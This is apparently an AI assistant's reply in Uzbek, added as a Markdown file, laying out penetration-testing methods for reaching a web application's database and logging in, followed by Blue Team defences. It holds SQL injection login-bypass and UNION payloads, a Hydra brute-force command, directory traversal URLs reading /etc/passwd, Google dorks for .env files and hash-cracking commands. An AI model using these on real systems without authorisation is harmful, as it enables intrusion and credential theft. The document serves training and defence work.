@@ -1,0 +1,138 @@
+Bu vazifa **penetratsion test (penetration testing) yoki ethical hacking** doirasiga kiradi va **CTF (Capture The Flag)** yoki **Red Team vs Blue Team** formatidagi kiberxavfsizlik mashg‘ulotlarida qo‘llaniladi.  
+
+---
+
+### **1. Ma’lumotlar bazasiga kirish uchun mumkin bo‘lgan usullar**
+Ma’lumotlar bazasiga kirish va veb-ilovaga login qilish uchun bir nechta hujum usullari mavjud:  
+
+✅ **1. SQL Injection (SQLi)**  
+   - Agar veb-ilova ma’lumotlar bazasiga so‘rovlarni to‘g‘ridan-to‘g‘ri yuborsa va **foydalanuvchi kiritgan ma’lumotni filtrlamasa**, SQL Injection hujumidan foydalanish mumkin.  
+   - **Test qilish:**  
+     1. Kirish sahifasida **username** yoki **parol** maydoniga quyidagi so‘zlarni kiritish:
+        ```
+        ' OR 1=1 --  
+        " OR 1=1 --  
+        admin' --  
+        ```
+     2. Agar bu usul orqali tizimga kirish mumkin bo‘lsa, demak, ilova himoyasiz.  
+
+   - **SQL orqali foydalanuvchilarni chiqarish:**  
+     ```
+     ' UNION SELECT 1, username, password FROM users --  
+     ```
+
+   - **Himoyalanish usuli:**  
+     - Prepared statements (`Parameterized Queries`) ishlatish  
+     - Ma’lumotlarni filtr qilish (`input validation`)  
+     - WAF (Web Application Firewall) ishlatish  
+
+✅ **2. Ma’lumotlar bazasiga bevosita ulanish**  
+   - Agar **IP manzili berilgan bo‘lsa** va port ochiq bo‘lsa, quyidagi vositalar bilan bog‘lanish mumkin:  
+     - **MySQL:**  
+       ```
+       mysql -u root -h <IP> -p
+       ```
+     - **PostgreSQL:**  
+       ```
+       psql -h <IP> -U postgres
+       ```
+     - **MSSQL:**  
+       ```
+       sqlcmd -S <IP> -U sa -P <parol>
+       ```
+   - **Portlarni tekshirish:**  
+     ```
+     nmap -p 3306,5432,1433 <IP>
+     ```
+
+✅ **3. Default yoki oddiy parollarni tekshirish**  
+   - Ko‘p hollarda **default parollar** ishlatiladi, masalan:  
+     ```
+     root:root  
+     admin:admin  
+     postgres:postgres  
+     ```
+   - **Brute-force uchun Hydra yoki Medusa ishlatish:**  
+     ```
+     hydra -l admin -P passwords.txt <IP> mysql
+     ```
+
+✅ **4. Config va environment fayllarni qidirish**  
+   - Agar veb-ilovada **ma’lumotlar bazasi paroli** qayerdadir ochiq saqlangan bo‘lsa, uni topish mumkin.  
+   - **Ko‘p uchraydigan joylar:**  
+     - `.env` faylida:
+       ```
+       DB_HOST=127.0.0.1
+       DB_USERNAME=root
+       DB_PASSWORD=secret
+       ```
+     - `config.php` yoki `settings.py` fayllarida:
+       ```
+       $db_password = "admin123";
+       ```
+   - **Google Dorking bilan qidirish:**  
+     ```
+     site:example.com filetype:env
+     ```
+
+✅ **5. Directory Traversal orqali fayllarni o‘qish**  
+   - Agar ilova kataloglararo o‘tish imkonini bersa, quyidagi URL orqali konfiguratsiya fayllarini ko‘rish mumkin:  
+     ```
+     http://example.com/download.php?file=../../../../etc/passwd
+     http://example.com/?page=../../config.php
+     ```
+
+✅ **6. Veb-ilovada admin panelni topish**  
+   - Ko‘p veb-ilovalarda **standart admin sahifalari** mavjud bo‘lib, ularni topish mumkin:  
+     ```
+     http://example.com/admin  
+     http://example.com/login  
+     http://example.com/cms  
+     ```
+   - **Gobuster yoki dirb bilan qidirish:**  
+     ```
+     gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt
+     ```
+
+---
+
+### **2. Hujum natijasida veb ilovaga login qilish**
+Agar yuqoridagi usullar orqali **ma’lumotlar bazasidan foydalanuvchi nomi va parol** olingan bo‘lsa:  
+
+1️⃣ **Agar parol oddiy matn ko‘rinishida bo‘lsa**, uni login sahifasida ishlatish mumkin.  
+2️⃣ **Agar parol hashlangan bo‘lsa** (`MD5`, `SHA-256`), uni **hash-cracking** vositalari bilan ochish kerak:  
+   ```
+   hashcat -m 0 -a 0 hash.txt rockyou.txt
+   john --wordlist=rockyou.txt hash.txt
+   ```
+
+---
+
+### **3. Himoyalanish Tavsiyalari (Blue Team uchun)**
+Agar bu test himoyalanish maqsadida o‘tkazilayotgan bo‘lsa, quyidagi choralarni ko‘rish kerak:  
+
+✅ **1. SQL Injection oldini olish**  
+   - **ORM va parametrik so‘rovlar** ishlatish (`Prepared Statements`)  
+   - `mysqli_real_escape_string()` yoki `pg_escape_string()` ishlatish  
+
+✅ **2. Portlarni yopish va firewall o‘rnatish**  
+   ```
+   ufw deny 3306
+   ufw deny 5432
+   ```
+
+✅ **3. Foydalanuvchilar va parollarni kuchaytirish**  
+   - Minimal 12 belgili parollar  
+   - 2FA (Ikki faktorli autentifikatsiya)  
+
+✅ **4. Loglarni tekshirish va monitoring qilish**  
+   - `fail2ban` yoki `WAF (ModSecurity, Cloudflare)` o‘rnatish  
+   - Loglarni avtomatik tekshirish uchun **SIEM tizimlar** ishlatish  
+
+---
+
+### **Xulosa**
+Agar bu **hujum (Red Team)** bo‘lsa, yuqoridagi usullar orqali tizimga kirish sinovdan o‘tkaziladi.  
+Agar **himoyalanish (Blue Team)** bo‘lsa, muammolar bartaraf etilishi kerak.  
+
+Siz aynan qaysi qismni chuqurroq tahlil qilmoqchisiz? 🔥
